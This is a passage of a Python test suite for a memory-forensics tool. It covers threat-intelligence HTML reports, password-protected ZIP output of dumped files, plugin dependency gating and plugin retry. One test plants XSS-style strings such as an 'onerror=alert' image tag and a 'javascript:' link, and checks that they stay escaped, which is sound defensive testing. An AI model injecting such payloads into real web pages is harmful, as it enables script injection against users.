        (case / "threat_intelligence").mkdir(exist_ok=True)
        (case / "threat_intelligence" / "ti_report.json").write_text(json.dumps({
            "generated": "now", "objects": 1, "shortlist": [{"score": 99, "type": "file", "name": "<img src=x onerror=alert(1)>",
                                                              "reasons": [{"points": 1, "text": "</script><b>x"}]}],
            "yara_hits": [{"severity": "HIGH", "rule": "R", "namespace": "n", "reference": "javascript:alert(1)",
                           "strings": [], "tags": []}],
            "inventory": [{"kind": "file", "name": "a"}] * 3000}), encoding="utf-8")
        from modules.html_report import HTMLReportGenerator
        out = HTMLReportGenerator(logging.getLogger("t"), "windows").generate(case)
        html = Path(out).read_text(encoding="utf-8")
        check("report: Threat Intelligence tab present", "['ti','Threat Intelligence',pageThreatIntel]" in html
              and "function pageThreatIntel" in html)
        check("report: TI data not row-capped (3000 inventory rows embedded)", html.count('"kind":"file","name":"a"') >= 3000
              or html.count('"kind": "file", "name": "a"') >= 3000)
        check("report: hostile strings stay escaped in the payload", "<img src=x" not in html and "</script><b>" not in html)
        check("report: only http(s) links are rendered", "/^https?:\\/\\//i.test" in html)
        # ---- bulk dump: outputs attributed by the FILE_OBJECT address in the name
        from modules import extract_jobs as xj

        class FV:
            os_type, vol_version, vol3_cmd, vol2_cmd, profile = "windows", "vol3", "vol3", "vol2", "Win7SP1x64"
        j = xj.Job({"kind": "files", "case": str(case), "image": "x.raw", "dest": str(tmp / "xd"), "batch": 400,
                    "flags": ["--physaddr"], "vol2_fallback": False}, FV(), logging.getLogger("t"))
        seen = []

        def fake_run(argv, key, n=1, floor=300, cwd=None):
            seen.append(argv)
            o = Path(argv[argv.index("-o") + 1])
            (o / "file.0x10.0xaa.DataSectionObject.same.txt.dat").write_bytes(b"one")
            (o / "file.0x20.0xbb.DataSectionObject.same.txt.dat").write_bytes(b"two")
            return 0, "", "", 1.0, False
        j.run = fake_run
        items = [{"name": "same.txt", "path": r"\a\same.txt", "offset": "0x10"},
                 {"name": "same.txt", "path": r"\b\same.txt", "offset": "0x20"},
                 {"name": "gone.txt", "path": r"\c\gone.txt", "offset": "0x30"}]
        j._files_windows(items)
        outs = [[o["file"] for o in it["outputs"]] for it in j.items]
        check("bulk dump: one Volatility run, same-named files attributed by address, no Vol2 fallback",
              len(seen) == 1 and "0x10" in outs[0][0] and "0x20" in outs[1][0] and not outs[2]
              and j.items[2]["status"] == "empty", (len(seen), outs))
        # ---- "auto" flags: physical offsets (Win7) -> --physaddr, kernel-virtual (Win10+) -> --virtaddr,
        #      each object in exactly one pass; "quiet": no line per object, a running total instead
        j = xj.Job({"kind": "files", "case": str(case), "image": "x.raw", "dest": str(tmp / "xa"), "batch": 400,
                    "flags": "auto", "vol2_fallback": False, "quiet": 2}, FV(), logging.getLogger("t"))
        seen = []

        def fake_run2(argv, key, n=1, floor=300, cwd=None):
            seen.append(argv)
            o = Path(argv[argv.index("-o") + 1])
            k = argv.index("windows.dumpfiles.DumpFiles")
            for a in argv[k + 2:]:
                if a != "0xffffdf8800003000":
                    (o / f"file.{a}.0xaa.DataSectionObject.x.dat").write_bytes(b"data")
            return 0, "", "", 1.0, False
        j.run = fake_run2
        said = []
        old_ok, old_warn, old_info = xj.msg_ok, xj.msg_warn, xj.msg_info
        xj.msg_ok = xj.msg_warn = xj.msg_info = lambda m, *a, **k: said.append(m)
        try:
            j._files_windows([{"name": "p.txt", "path": r"\p.txt", "offset": "0xf27070"},
                              {"name": "v.txt", "path": r".txt", "offset": "0xffffdf8800001000"},
                              {"name": "v2.txt", "path": r"2.txt", "offset": "0xffffdf8800002000"},
                              {"name": "gone.txt", "path": r"\gone.txt", "offset": "0xffffdf8800003000"}])
        finally:
            xj.msg_ok, xj.msg_warn, xj.msg_info = old_ok, old_warn, old_info
        flags = [(a[a.index("windows.dumpfiles.DumpFiles") + 1], a[a.index("windows.dumpfiles.DumpFiles") + 2:])
                 for a in seen]
        check("bulk dump auto flags: physical -> --physaddr, virtual -> --virtaddr, one pass each",
              flags == [("--physaddr", ["0xf27070"]),
                        ("--virtaddr", ["0xffffdf8800001000", "0xffffdf8800002000", "0xffffdf8800003000"])]
              and [it["status"] for it in j.items] == ["ok", "ok", "ok", "empty"], (flags, [it["status"] for it in j.items]))
        check("bulk dump quiet: running totals only, no line per object",
              said and all("so far" in m for m in said) and not any("p.txt" in m for m in said), said)
        # ---- shortlist: an indicator whose only reason is a LOW feed hit stays off the list
        T.notes = []
        low = [{"kind": "domain", "value": "blocked.example", "source": "maltrail", "source_name": "Maltrail",
                "label": "malware: x", "weight": 1, "confidence": "LOW", "found_in": ["strings"]}]
        sl2 = T.shortlist(inv, [], low + fh)
        names = {s["name"] for s in sl2}
        check("shortlist: LOW-only feed hits stay in the feed table, not on the list",
              "blocked.example" not in names and "45.148.10.151" in names and "a.exe" in names
              and any("only reason is a LOW feed hit" in n for n in T.notes), (names, T.notes))
        # ---- a flagged Linux process whose exe was not in RAM: its libraries do not each get the flag
        libs = [dict(inv[0], kind="process", name=f"lib{k}.so", path=f"/usr/lib/lib{k}.so", pid="77", process="evil",
                     file=f"dumps/processes/pid_77/exe/{k}.dmp", sha256=str(k) * 64, location="system",
                     executable=True, flags=["Injection: 1 HIGH, 0 MEDIUM"], library=True) for k in (1, 2, 3)]
        sl3 = T.shortlist(libs, [], [])
        p77 = [s for s in sl3 if s["pid"] == "77"]
        check("shortlist: flagged process with only libraries dumped = ONE entry, no library hashes",
              len(p77) == 1 and p77[0]["type"] == "process" and not p77[0]["sha256"], p77)
    finally:
        if old_home is None:
            os.environ.pop("RAMBREAKER_HOME", None)
        else:
            os.environ["RAMBREAKER_HOME"] = old_home
        shutil.rmtree(tmp, ignore_errors=True)


def test_gui_threat_intel():
    """v2.2 GUI: the TI dialogs have help on every control, options -> CLI, key never on the CLI."""
    try:
        os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
        from PySide6.QtWidgets import QApplication
    except Exception:
        print("  SKIP  gui threat intel (PySide6 not installed)")
        return
    print("[gui threat intel]")
    app = QApplication.instance() or QApplication([])
    from gui import main_window as mw, theme, widgets
    from gui.help_check import check as help_cover
    from gui.ti_dialog import DatabasesDialog, ThreatIntelDialog
    widgets.set_theme(theme.palette("dark"))
    d = ThreatIntelDialog(dict(mw.DEFAULT_SETTINGS), "case_x")
    cov = help_cover(d)
    check("TI dialog: every control has help", not cov["missing"] and not cov["invalid"], cov)
    d.key.setText("SECRETKEY")
    d.rate.setValue(4)
    d.max.setValue(50)
    a = d.cli_args()
    check("TI dialog: options -> CLI, key NOT on the command line",
          "SECRETKEY" not in " ".join(a) and a[a.index("--vt-max") + 1] == "50" and "--no-vt" not in a, a)
    d.novt.setChecked(True)
    check("TI dialog: local only -> --no-vt and no key", "--no-vt" in d.cli_args() and d.result_opts()["vt_key"] == "")
    db = DatabasesDialog()
    cov = help_cover(db)
    check("TI databases dialog: every control has help", not cov["missing"] and not cov["invalid"], cov)
    check("TI databases: one row per source", db.db.table.rowCount() == len(__import__("modules.ti_sources", fromlist=["x"]).SOURCES))
    names = [p[0] for p in mw.PRESETS]
    check("preset list has DFIR + Threat Intel -> CLI dfir-ti",
          any(c == "dfir-ti" for _, c, _ in mw.PRESETS), names)
    d.close()
    db.close()


def test_safe_zip():
    """v2.5: every dumped file goes straight into its own password-protected ZIP
    (AES-256): the plain bytes never reach the disk, hashes come from the ZIP's
    metadata, YARA decrypts in memory only."""
    print("[protected output]")
    import hashlib
    import io
    import random
    import shutil
    import subprocess
    import tarfile
    import tempfile
    from modules import safe_zip as sz
    from modules import extract_jobs as xj
    from modules import threat_intel as ti
    lg = logging.getLogger("t")
    tmp = Path(tempfile.mkdtemp())
    try:
        # ---- format: out-of-order writes with holes, like windows.dumpfiles
        rnd = random.Random(5)
        model = bytearray()
        w = sz.AesZipWriter(str(tmp / "r.zip"), "evil.exe.dat")
        for _ in range(200):
            off, n = rnd.randrange(0, 600_000), rnd.randrange(1, 20_000)
            d = os.urandom(n) if rnd.random() < 0.7 else bytes(n)
            w.write_at(off, d)
            model.extend(bytes(max(0, off + n - len(model))))
            model[off:off + n] = d
        meta = w.finish()
        check("safe zip: out-of-order writes with holes decrypt to the exact bytes",
              sz.read_member(tmp / "r.zip") == bytes(model))
        check("safe zip: metadata = hashes of the plain content, readable without the password",
              meta["sha256"] == hashlib.sha256(model).hexdigest() and sz.read_meta(tmp / "r.zip") == meta
              and meta["size"] == len(model))
        marker = b"RB-PLAIN-MARKER-" * 64
        w = sz.AesZipWriter(str(tmp / "m.zip"), "m.txt")
        w.write_at(0, marker)
        w.finish()
        check("safe zip: the plain bytes do not appear in the ZIP file", marker[:16] not in (tmp / "m.zip").read_bytes())
        try:
            sz.read_member(tmp / "m.zip", "wrong")
            bad_pw = False
        except ValueError:
            bad_pw = True
        raw = bytearray((tmp / "m.zip").read_bytes())
        raw[150] ^= 1
        (tmp / "t.zip").write_bytes(raw)
        try:
            sz.read_member(tmp / "t.zip")
            tampered = False
        except ValueError:
            tampered = True
        check("safe zip: wrong password and altered data are refused", bad_pw and tampered)
        import zipfile
        with zipfile.ZipFile(tmp / "r.zip") as z:
            zi = z.infolist()[0]
        check("safe zip: valid ZIP structure (member name, size, encrypted flag)",
              zi.filename == "evil.exe.dat" and zi.file_size == len(model) and zi.flag_bits & 1)
        tar = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "tar.exe"
        if os.name == "nt" and tar.is_file():
            (tmp / "tx").mkdir()
            r = subprocess.run([str(tar), "-xf", str(tmp / "r.zip"), "--passphrase", "infected", "-C",
                                str(tmp / "tx")], capture_output=True)
            got = (tmp / "tx" / "evil.exe.dat").read_bytes() if (tmp / "tx" / "evil.exe.dat").is_file() else b""
            check("safe zip: Windows' built-in tar (libarchive) opens it with the password",
                  r.returncode == 0 and got == bytes(model), r.stderr[-200:])
        # ---- describe / page gaps / PE size: same answers for the plain file and its ZIP
        pe = bytearray(0x500)
        pe[0:2] = b"MZ"
        pe[0x3C:0x40] = (0x40).to_bytes(4, "little")
        pe[0x40:0x44] = b"PE\0\0"
        pe[0x46:0x48] = (1).to_bytes(2, "little")             # one section, no optional header
        pe[0x58 + 16:0x58 + 20] = (0x200).to_bytes(4, "little")
        pe[0x58 + 20:0x58 + 24] = (0x400).to_bytes(4, "little")
        pe += bytes(4096 * 2) + b"tail"                       # two all-zero pages
        (tmp / "p.exe").write_bytes(pe)
        plain = (xj.describe(tmp / "p.exe"), ti.page_gaps(tmp / "p.exe"), ti.pe_declared_size(tmp / "p.exe"))
        zp = Path(sz.pack_file(tmp / "p.exe"))
        dz = xj.describe(zp)
        prot = (dict((k, v) for k, v in dz.items() if k != "protected"), ti.page_gaps(zp), ti.pe_declared_size(zp))
        check("describe/page_gaps/pe size: ZIP metadata gives the plain file's values",
              plain == prot and dz.get("protected") and not (tmp / "p.exe").exists(), (plain, prot))
        e = {"size": dz["size"], "nonzero_pct": dz["nonzero_pct"], "kind": "file", "type": dz["type"]}
        check("hash quality: judged through the ZIP (zero pages -> partial)",
              ti.hash_quality(e, zp)[0] == "partial", ti.hash_quality(e, zp))
        (tmp / "x.img").write_bytes(b"MZ1")
        img = Path(sz.pack_file(tmp / "x.img"))
        check("hash quality: .img inside a ZIP is still 'rebuilt'",
              ti.hash_quality({"size": 3, "nonzero_pct": 100, "kind": "file"}, img)[0] == "rebuilt")

        # ---- the real Volatility 3 CLI file handler (patched + installed hook)
        root = Path(__file__).resolve().parents[2]
        v3root = root / "runtime" / "volatility3"
        inst = v3root / "volatility3" / "rb_safe_zip.py"
        from modules.installer import VolatilityInstaller
        fx = [f for f in VolatilityInstaller._FRAMEWORK_FIXES if f[0] == "cli/__init__.py" and sz.ENV_ON in f[2]]
        check("vol3 hook: CLI patch in the fix table", len(fx) == 1 and fx[0][1] in fx[0][2])
        if inst.is_file():
            check("vol3 hook: installed copy == modules/safe_zip.py (re-run prepare_vol3 after edits)",
                  inst.read_bytes() == (root / "src" / "modules" / "safe_zip.py").read_bytes())
            sys.path.insert(0, str(v3root))
            os.environ[sz.ENV_ON] = "1"
            try:
                import volatility3.cli as vcli
                cl = vcli.CommandLine()
                cl.output_dir = str(tmp / "v3")
                H = cl.file_handler_class_factory()
            finally:
                os.environ.pop(sz.ENV_ON, None)
                sys.path.remove(str(v3root))
            name = "file.0x10.0x20.ImageSectionObject.evil.exe.img"
            h = H(name)
            h.seek(8192)
            h.write(b"B" * 100)
            h.seek(0)
            h.write(b"MZ" + b"A" * 98)
            h.close()
            with H(name) as h2:
                h2.write(b"second")
            outs = sorted(os.listdir(tmp / "v3"))
            check("vol3 hook: Volatility's own file handler writes only ZIPs (no plain file, no temp left)",
                  outs == [name.replace(".img", "-1.img") + ".zip", name + ".zip"], outs)
            check("vol3 hook: seeks and holes as in a plain file; final name reported to the plugin",
                  sz.read_member(tmp / "v3" / (name + ".zip")) == b"MZ" + b"A" * 98 + bytes(8092) + b"B" * 100
                  and h.preferred_filename == name + ".zip")
            check("vol3 hook: unpatched behaviour without RAMBREAKER_SAFE_ZIP",
                  vcli.CommandLine().file_handler_class_factory().__name__ == "CLIDirectFileHandler")

        # ---- extraction job: hooked Vol3 output + plain Vol2 fallback output
        case = tmp / "case"
        (case / "json").mkdir(parents=True)
        (case / "SUMMARY.txt").write_text("OS: windows\n", encoding="utf-8")

        class FV:
            os_type, vol_version, vol3_cmd, vol2_cmd, profile = "windows", "vol3", "vol3", "vol2", "Win7SP1x64"
        said = []
        old = xj.msg_ok, xj.msg_warn, xj.msg_info
        xj.msg_ok = xj.msg_warn = xj.msg_info = lambda m, *a, **k: said.append(m)
        try:
            j = xj.Job({"kind": "files", "case": str(case), "image": "x.raw", "dest": str(tmp / "xd"),
                        "flags": ["--physaddr"], "protect": True}, FV(), lg)
            body = {"0x10": b"MZ-vol3-image", "0x20": b"vol2-plain-data"}

            def fake_run(argv, key, n=1, floor=300, cwd=None):
                if "dumpfiles" in argv:                          # Vol2: plain file, no hook
                    o = Path(argv[argv.index("-D") + 1])
                    (o / "file.None.0xfa80.dat").write_bytes(body[argv[argv.index("-Q") + 1]])
                    return 0, "", "", 1.0, False
                o = Path(argv[argv.index("-o") + 1])               # hooked Vol3: ZIPs only
                f = o / "file.0x10.0xaa.ImageSectionObject.evil.exe.img"
                f.write_bytes(body["0x10"])
                sz.pack_file(f)
                (o / "tmp_dead.rbzip.tmp").write_bytes(b"half written")
                return 0, "", "", 1.0, False
            j.run = fake_run
            j._files_windows([{"name": "evil.exe", "path": r"\evil.exe", "offset": "0x10"},
                              {"name": "old.dat", "path": r"\old.dat", "offset": "0x20"}])
            j.write_manifest()
        finally:
            xj.msg_ok, xj.msg_warn, xj.msg_info = old
        man = json.loads((tmp / "xd" / "manifest.json").read_text(encoding="utf-8"))
        files = [p for p in (tmp / "xd").rglob("*") if p.is_file()]
        meta_names = {"manifest.json", "manifest.txt", "PROTECTED_FILES_README.txt"}
        dumps = [p for p in files if p.name not in meta_names]
        check("job: every extracted file is a protected ZIP, no plain file and no temp file left",
              len(dumps) == 2 and all(sz.is_protected(p) for p in dumps), [p.name for p in files])
        o1, o2 = (it["outputs"][0] for it in man["items"])
        check("job: hashes/type in the manifest are of the file inside",
              o1["sha256"] == hashlib.sha256(body["0x10"]).hexdigest() and o1["type"].startswith("PE")
              and o2["sha256"] == hashlib.sha256(body["0x20"]).hexdigest(), (o1, o2))
        check("job: ImageSectionObject recognised through the .zip suffix",
              o1.get("object", "").startswith("ImageSectionObject"), o1)
        check("job: manifest + README name the password; Vol2 output counted as zipped after write",
              man["protection"]["password"] == "infected" and man["protection"]["zipped_after_write"] == 1
              and "tar -xf" in (tmp / "xd" / "PROTECTED_FILES_README.txt").read_text(encoding="utf-8")
              and "PROTECTED" in (tmp / "xd" / "manifest.txt").read_text(encoding="utf-8"))
        check("job: Volatility gets RAMBREAKER_SAFE_ZIP=1 and the password",
              j.env[sz.ENV_ON] == "1" and j.env[sz.ENV_PW] == "infected")
        j0 = xj.Job({"kind": "files", "case": str(case), "image": "x.raw", "dest": str(tmp / "xn")}, FV(), lg)
        check("job: protection off -> plain files, Volatility environment untouched", j0.env is None and not j0.protect)

        # ---- an earlier plain dump is zipped when reused
        old_d = tmp / "old"
        (old_d / "files").mkdir(parents=True)
        (old_d / "files" / "a.dat").write_bytes(b"MZ old")
        (old_d / "manifest.json").write_text(json.dumps({"items": [{"outputs": [{"file": "files/a.dat"}]}]}),
                                             encoding="utf-8")
        n = xj.protect_existing(old_d)
        m2 = json.loads((old_d / "manifest.json").read_text(encoding="utf-8"))
        check("protect_existing: plain dump zipped in place, manifest updated, second call is a no-op",
              n == 1 and m2["items"][0]["outputs"][0]["file"] == "files/a.dat.zip"
              and not (old_d / "files" / "a.dat").exists() and xj.protect_existing(old_d) == 0)

        # ---- YARA on a protected object: decrypted in memory only
        try:
            import yara
            yara.compile(source='rule rb_t { strings: $a = "RB-YARA-MARK" condition: $a }').save(str(tmp / "r.yarc"))
            (tmp / "y.bin").write_bytes(b"xx RB-YARA-MARK yy")
            yz = sz.pack_file(tmp / "y.bin")
            ti._yara_init(str(tmp / "r.yarc"), "infected")
            idx, ms, err = ti._yara_scan((0, yz, r"C:\x\y.bin"))
            check("ti YARA: rule matches inside a protected ZIP", [m["rule"] for m in ms] == ["rb_t"] and not err,
                  (ms, err))
        except ImportError:
            pass

        # ---- Linux RecoverFs: the tarball (a protected ZIP) is streamed, each file re-zipped
        tb = io.BytesIO()
        with tarfile.open(fileobj=tb, mode="w:gz") as tf:
            for nm, data in (("root/etc/passwd", b"root:x:0:0"), ("root/tmp/x.sh", b"#!/bin/sh\nevil")):
                info = tarfile.TarInfo(nm)
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))

        class LV:
            os_type, vol_version, vol3_cmd, vol2_cmd, profile = "linux", "vol3", "vol3", "", ""

        def fake_recover(self, argv, key, n=1, floor=300, cwd=None):
            o = Path(argv[argv.index("-o") + 1])
            (o / "recovered_fs.tar.gz").write_bytes(tb.getvalue())
            sz.pack_file(o / "recovered_fs.tar.gz")
            return 0, "", "", 1.0, False
        real_run = xj.Job.run
        xj.Job.run = fake_recover
        old = xj.msg_ok, xj.msg_warn, xj.msg_info, ti.msg_info, ti.msg_ok
        xj.msg_ok = xj.msg_warn = xj.msg_info = ti.msg_info = ti.msg_ok = lambda m, *a, **k: None
        try:
            lc = tmp / "lcase"
            (lc / "json").mkdir(parents=True)
            (lc / "SUMMARY.txt").write_text("OS: linux\n", encoding="utf-8")
            T = ti.ThreatIntel(lc, "x.lime", LV(), lg, {})
            lm = T._recoverfs(T.dumps / "files", [])
        finally:
            xj.Job.run = real_run
            xj.msg_ok, xj.msg_warn, xj.msg_info, ti.msg_info, ti.msg_ok = old
        lfiles = sorted(p.name for p in (T.dumps / "files").rglob("*") if p.is_file())
        sh = {it["label"]: it["outputs"][0]["sha256"] for it in lm["items"]}
        check("ti RecoverFs: tarball streamed from its ZIP, every file re-zipped, nothing plain on disk",
              lfiles == ["000001_passwd.zip", "000002_x.sh.zip", "manifest.json", "recovered_fs.tar.gz.zip"]
              and sh.get("/etc/passwd") == hashlib.sha256(b"root:x:0:0").hexdigest()
              and lm.get("protection", {}).get("password") == "infected", (lfiles, sh))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_dependency_gate():
    """v2.4.1: a dependent plugin waits for its parent and is skipped only when the parent
    really failed (before, every plugin was submitted up front and nothing was ever skipped)."""
    print("[dependency gate]")
    import tempfile, shutil, threading, time as _t
    from modules.dep_gate import DependencyGate, failure_kind, is_hard_failure
    from modules.extractor import _load_os_module
    win = _load_os_module("windows")
    sn = win._short_name

    # failure classification
    check("deps: plugin error is hard", is_hard_failure(
        {"success": False, "returncode": 1, "error": "Unsatisfied requirement plugins.X.kernel"}))
    for res, kind in (({"success": False, "returncode": -1, "error": "Timeout after 300s"}, "timed out"),
                      ({"success": False, "error": "Timed out twice (300s, then 750s)", "timed_out": True}, "timed out"),
                      ({"success": False, "returncode": 1, "error": "kernel.symbol_table_name missing"},
                       "symbol tables not ready yet"),
                      ({"success": False, "returncode": 3221225794, "error": "Windows could not start ..."},
                       "process did not run"),
                      ({"success": False, "returncode": -1, "error": "boom"}, "process did not run"),
                      (None, "process did not run"), ({"success": True}, "ok")):
        check(f"deps: '{kind}' does not skip dependents ({str(res)[:40]})",
              failure_kind(res) == kind and not is_hard_failure(res), failure_kind(res))

    # the Windows table: list-walk dependents gated, fallback scanners not
    full = win.PLUGINS["vol3-windows-full"].split()
    g = DependencyGate(full, win.DEPENDENCIES, sn)
    first = g.initial()
    check("deps: pslist dependents wait, psscan/modscan do not",
          "windows.cmdline.CmdLine" not in first and "windows.malfind.Malfind" not in first
          and "windows.psscan.PsScan" in first and "windows.modscan.ModScan" in first, first)
    check("deps: netstat waits for netscan (one-way)",
          "windows.netstat.NetStat" not in first and "windows.netscan.NetScan" in first, first)
    rel, skp = g.finished("windows.pslist.PsList", True)
    skipped = {c for c, _ in skp}
    check("deps: failed pslist skips exactly its dependents",
          skipped == {p for p in full if sn(p) in win.DEPENDENCIES["pslist"]} and not rel, sorted(skipped))
    check("deps: skip reason is the parent", all(par == "pslist" for _, par in skp), skp)
    rel, skp = g.finished("windows.netscan.NetScan", False)
    check("deps: timed-out netscan still releases netstat", rel == ["windows.netstat.NetStat"] and not skp, rel)
    g.finished("windows.registry.hivelist.HiveList", False)
    check("deps: every plugin started or skipped", g.unreleased() == [], g.unreleased())

    # edge cases
    g = DependencyGate(["a", "b"], {"a": {"b"}, "b": {"a"}}, lambda p: p)
    check("deps: mutual edge cannot deadlock", g.initial() == ["a", "b"])
    g = DependencyGate(["b", "c"], {"a": {"b"}}, lambda p: p)
    check("deps: parent not in this batch gates nothing", g.initial() == ["b", "c"])
    g = DependencyGate(["a", "b", "c"], {"a": {"b"}, "b": {"c"}}, lambda p: p)
    g.initial()
    rel, skp = g.finished("a", True)
    check("deps: skip cascades to grand-children", skp == [("b", "a"), ("c", "b")] and not rel, skp)

    # the real runners with a fake Volatility: no dependent starts before its parent ends
    class FakeVol:
        def __init__(self, os_type, parent_res):
            self.os_type, self.vol_version, self.profile = os_type, "vol3", ""
            self.vol3_cmd, self.vol2_cmd = "fake", None
            self.parent_res, self.lock = parent_res, threading.Lock()
            self.started, self.ended = {}, {}

        def run_plugin(self, image, plugin, output_dir, version=None, extra_args=None, fixed_timeout=None):
            with self.lock:
                self.started[plugin] = _t.perf_counter()
            _t.sleep(0.05 if "pslist" in plugin or "netscan" in plugin else 0.01)
            res = dict(self.parent_res) if sn(plugin) in ("pslist",) else {"success": True, "error": ""}
            res.setdefault("duration", 0.01)
            res["plugin"] = plugin
            with self.lock:
                self.ended[plugin] = _t.perf_counter()
            return res

    from modules import extractor as ex
    d = Path(tempfile.mkdtemp())
    try:
        img = d / "img.raw"
        img.write_bytes(b"\0" * 4096)
        quiet = logging.getLogger("deps-test")
        quiet.addHandler(logging.NullHandler())
        quiet.propagate = False
        for os_type, mode, parent_res, expect_skip in (
                ("windows", "full", {"success": False, "returncode": 1,
                                     "error": "Unsatisfied requirement plugins.PsList.kernel"}, True),
                ("windows", "full", {"success": False, "returncode": -1, "error": "Timeout after 120s"}, False),
                ("linux", "full", {"success": False, "returncode": 1,
                                   "error": "Unsatisfied requirement plugins.PsList.kernel"}, True)):
            fv = FakeVol(os_type, parent_res)
            e = ex.Extractor(fv, quiet, 4)
            e._warm_cache = lambda image: None
            e._run_targeted_printkey = lambda image, od: None
            e._symbol_fix_attempted = True
            od = d / f"case_{os_type}_{expect_skip}"
            r = e.run(str(img), od, mode)
            mod = _load_os_module(os_type)
            plist = mod.PLUGINS[f"vol3-{os_type}-{mode}"].split()
            kids = [p for p in plist if mod._short_name(p) in mod.DEPENDENCIES.get("pslist", set())]
            ran = [k for k in kids if k in fv.started]
            pl = next(p for p in fv.started if "pslist" in p.lower())
            order_ok = all(fv.started[k] >= fv.ended[pl] for k in ran)
            label = f"{os_type}, pslist {'fails' if expect_skip else 'times out'}"
            if expect_skip:
                check(f"deps run ({label}): dependents skipped, counted",
                      kids and not ran and r["dep_skipped"] == len(kids), (ran, r))
            else:
                check(f"deps run ({label}): dependents still run after it",
                      kids and len(ran) == len(kids) and order_ok and r["dep_skipped"] == 0, (ran, r))
            if os_type == "windows":
                check(f"deps run ({label}): psscan runs regardless", "windows.psscan.PsScan" in fv.started)
                ns, nt = "windows.netscan.NetScan", "windows.netstat.NetStat"
                check(f"deps run ({label}): netstat starts after netscan ends",
                      nt in fv.started and fv.started[nt] >= fv.ended[ns])
            check(f"deps run ({label}): every other plugin ran",
                  set(fv.started) == (set(plist) - set(kids)) | (set(kids) if not expect_skip else set()),
                  sorted(set(plist) ^ set(fv.started)))
    finally:
        shutil.rmtree(d, ignore_errors=True)


def test_plugin_retry():
    """v2.3: case plugin states (done / empty / failed / timeout / skipped / not run), dependents,
    affected steps, retry spec, and the GUI retry dialog + buttons."""
    print("[plugin retry]")
    import tempfile, shutil
    from modules import plugin_retry as pr
    d = Path(tempfile.mkdtemp())
    try:
        jd = d / "json"
        jd.mkdir()
        (d / "SUMMARY.txt").write_text("Image:      X:\\none.raw\nOS:         windows\nMode:       fast\n"
                                       "Volatility: vol3\nProfile:    Win7SP1x64\nDuration:   100.0s\n", encoding="utf-8")
        big = '[{"PID": 4}]' * 400                       # > 2000 bytes, no failure marker
        (jd / "windows_pslist_PsList.json").write_text(big, encoding="utf-8")
        (jd / "windows_info_Info.json").write_text("[]", encoding="utf-8")             # ran OK, no rows
        (jd / "windows_netscan_NetScan.json").write_text("[]", encoding="utf-8")
        (jd / "windows_netscan_NetScan.json.error").write_text("Timeout after 209s", encoding="utf-8")
        (jd / "windows_malfind_Malfind.json").write_text("[]", encoding="utf-8")
        (jd / "windows_malfind_Malfind.json.error").write_text(
            "Volatility 3 Framework 2.28.2\nProgress:  0.00\nunsatisfied requirement kernel", encoding="utf-8")
        (jd / "windows_filescan_FileScan.json").write_text("Traceback (most recent call last): x" + " " * 50,
                                                          encoding="utf-8")
        (jd / "cmdscan_vol2.json").write_text('[{"a": 1}, {"b": 2}]', encoding="utf-8")
        rows = {r["plugin"]: r for r in pr.case_plugin_states(d)}
        st = {k: v["state"] for k, v in rows.items()}
        check("retry: pslist done, info empty", st.get("windows.pslist.PsList") == "done"
              and st.get("windows.info.Info") == "empty", st)
        check("retry: netscan timeout with its last limit", st.get("windows.netscan.NetScan") == "timeout"
              and rows["windows.netscan.NetScan"]["last_limit_s"] == 209, rows.get("windows.netscan.NetScan"))
        check("retry: malfind failed, error without banner/progress lines",
              st.get("windows.malfind.Malfind") == "failed"
              and rows["windows.malfind.Malfind"]["error"] == "unsatisfied requirement kernel",
              rows.get("windows.malfind.Malfind"))
        check("retry: JSON with a Traceback counts as failed", st.get("windows.filescan.FileScan") == "failed", st)
        check("retry: Vol2 extra found on disk", st.get("cmdscan") == "done", st)
        check("retry: fast-mode plugin without output = not run", st.get("windows.hashdump.Hashdump") == "not run", st)
        # pslist fails -> its dependents that never ran become 'skipped'
        (jd / "windows_pslist_PsList.json.error").write_text("exit 1", encoding="utf-8")
        (jd / "windows_cmdline_CmdLine.json").unlink(missing_ok=True)
        rows2 = pr.case_plugin_states(d)
        st2 = {r["plugin"]: r for r in rows2}
        check("retry: dependents of a failed pslist are 'skipped'",
              st2["windows.cmdline.CmdLine"]["state"] == "skipped"
              and st2["windows.cmdline.CmdLine"]["parent"] == "windows.pslist.PsList",
              st2.get("windows.cmdline.CmdLine"))
        deps = pr.dependents("windows.pslist.PsList", rows2)
        check("retry: dependents() lists them", "windows.cmdline.CmdLine" in deps and
              "windows.malfind.Malfind" not in deps, deps)
        steps = pr.affected_steps(["windows.netscan.NetScan"], "windows")
        check("retry: netscan feeds network map / correlation / timeline / Sigma",
              {"Network map", "Correlation", "Timeline", "Sigma rules"} <= set(steps), steps)
        check("retry: registry step only on Windows",
              "Registry analysis" in pr.affected_steps(["windows.registry.printkey.PrintKey"], "windows")
              and "Registry analysis" not in pr.affected_steps(["printkey"], "linux"))
        spec = pr.make_spec([{"plugin": "windows.netscan.NetScan", "timeout": 1800},
                             {"plugin": "windows.netstat.NetStat", "timeout": None},
                             {"plugin": "timers", "timeout": 0}])
        check("retry: spec round trip (secs / auto / no limit)",
              pr.parse_spec(spec) == [{"plugin": "windows.netscan.NetScan", "timeout": 1800},
                                      {"plugin": "windows.netstat.NetStat", "timeout": None},
                                      {"plugin": "timers", "timeout": 0}], spec)
        # GUI
        try:
            os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
            from PySide6.QtWidgets import QApplication
        except Exception:
            print("  SKIP  gui retry (PySide6 not installed)")
            return
        app = QApplication.instance() or QApplication([])
        from gui import main_window as mw, theme, widgets
        from gui.help_check import check as help_cover
        from gui.retry_dialog import RetryDialog
        c = theme.palette("dark")
        widgets.set_theme(c)
        dlg = RetryDialog(st2["windows.netscan.NetScan"], [], steps, 49, 209, False, c)
        check("retry dialog: timeout pre-filled with double the last limit", dlg.limit.value() == 418,
              dlg.limit.value())
        dlg.nolimit.setChecked(True)
        check("retry dialog: 'no time limit' -> 0", dlg.timeout_s() == 0 and not dlg.limit.isEnabled())
        cov = help_cover(dlg)
        check("retry dialog: every control has help", not cov["missing"] and not cov["invalid"], cov)
        dq = RetryDialog(st2["windows.malfind.Malfind"], ["windows.cmdline.CmdLine"], steps, 30, 380, True, c)
        check("retry dialog: failed plugin -> calibrated limit, queued wording",
              dq.limit.value() == 380 and dq.ok.text() == "Queue retry")
        dlg.close()
        dq.close()
        saved = mw.save_settings
        mw.save_settings = lambda s: None          # the test must not write config/gui_settings.json
        w = mw.MainWindow()
        w.open_case(d)
        btns = {p: w.monitor.plugins.itemWidget(it, 4) for p, it in w.rows.items()}
